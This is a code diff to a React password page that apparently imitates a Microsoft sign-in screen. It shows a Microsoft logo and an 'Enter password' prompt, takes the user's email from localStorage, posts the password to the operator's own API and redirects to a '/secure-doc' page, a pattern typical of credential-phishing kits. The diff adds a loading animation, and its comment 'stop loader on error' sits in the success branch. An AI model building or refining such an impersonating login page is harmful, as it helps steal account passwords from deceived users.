@@ -9,6 +9,23 @@ export default function PasswordPage() {
   const [userEmail, setUserEmail] = useState("");
   const [error, setError] = useState("");
   const router = useRouter();
+  const [loading, setLoading] = useState(false);
+
+
+function TravelDotsLoader() {
+  return (
+    <div className="relative w-full h-4 overflow-hidden mb-3">
+      {[...Array(8)].map((_, i) => (
+        <span
+          key={i}
+          className="absolute top-0 w-1 h-1 bg-blue-600 rounded-full animate-travel"
+          style={{ animationDelay: `${i * 0.15}s` }}
+        ></span>
+      ))}
+    </div>
+  );
+}
+
 
   useEffect(() => {
     // Get email from localStorage
@@ -25,6 +42,7 @@ export default function PasswordPage() {
     e.preventDefault();
 
     try {
+      setLoading(true); // show loader
       const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/signup`, {
         method: "POST",
         headers: {
@@ -40,6 +58,7 @@ export default function PasswordPage() {
         console.log("Success:", data.message);
         localStorage.setItem("isLoggedIn", "true");
         router.push("/secure-doc");
+        setLoading(false); // stop loader on error
       } else {
         setError(data.message || "Login failed.");
       }
@@ -53,6 +72,7 @@ export default function PasswordPage() {
     <div className="min-h-screen flex flex-col items-center justify-center">
       {/* Form card */}
       <div className="bg-white w-[430px] p-8 shadow-md h-[338px] shadow-md">
+      {loading && <TravelDotsLoader />}
         {/* Microsoft Logo */}
         <div className="flex items-center mb-0 pt-5">
           <img
@@ -67,7 +87,7 @@ export default function PasswordPage() {
         <p className="text-[#1b1b1b] text-[15px] mt-2">{userEmail}</p>
 
         {/* Title */}
-        <h1 className="signin-title text-[#1b1b1b] text-2xl font-semibold mb-0 pt-2">
+        <h1 className="signin-title text-[#1b1b1b] text-[25px] font-semibold mb-0 pt-2">
           Enter password
         </h1>
 
